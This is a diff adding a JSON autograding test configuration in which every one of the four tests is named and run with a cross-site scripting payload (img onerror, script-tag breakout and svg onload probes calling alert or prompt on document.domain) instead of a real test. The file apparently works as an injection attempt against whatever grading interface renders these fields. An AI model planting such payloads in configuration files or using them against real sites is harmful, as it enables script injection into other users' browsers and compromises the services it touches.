@@ -1,0 +1,44 @@
+{
+  "tests": [
+    {
+      "name": "#<img src=x onerror=alert('XSS')>",
+      "setup": "#<img src=x onerror=alert('XSS')>",
+      "run": "#<img src=x onerror=alert('XSS')>",
+      "input": "",
+      "output": "",
+      "comparison": "included",
+      "timeout": 10,
+      "points": null
+    },
+    {
+      "name": "#<img src=x onerror=alert(document.domain)>",
+      "setup": "#<img src=x onerror=alert(document.domain)>",
+      "run": "#<img src=x onerror=alert(document.domain)>",
+      "input": "",
+      "output": "",
+      "comparison": "included",
+      "timeout": 10,
+      "points": null
+    },
+    {
+      "name": "--></script><script>alert(document.domain);//",
+      "setup": "--></script><script>alert(document.domain);//",
+      "run": "--></script><script>alert(document.domain);//",
+      "input": "",
+      "output": "",
+      "comparison": "included",
+      "timeout": 10,
+      "points": null
+    },
+    {
+      "name": "\"/><svg/onload=prompt(document.domain)>",
+      "setup": "\"/><svg/onload=prompt(document.domain)>",
+      "run": "\"/><svg/onload=prompt(document.domain)>",
+      "input": "",
+      "output": "",
+      "comparison": "included",
+      "timeout": 10,
+      "points": null
+    }
+  ]
+}
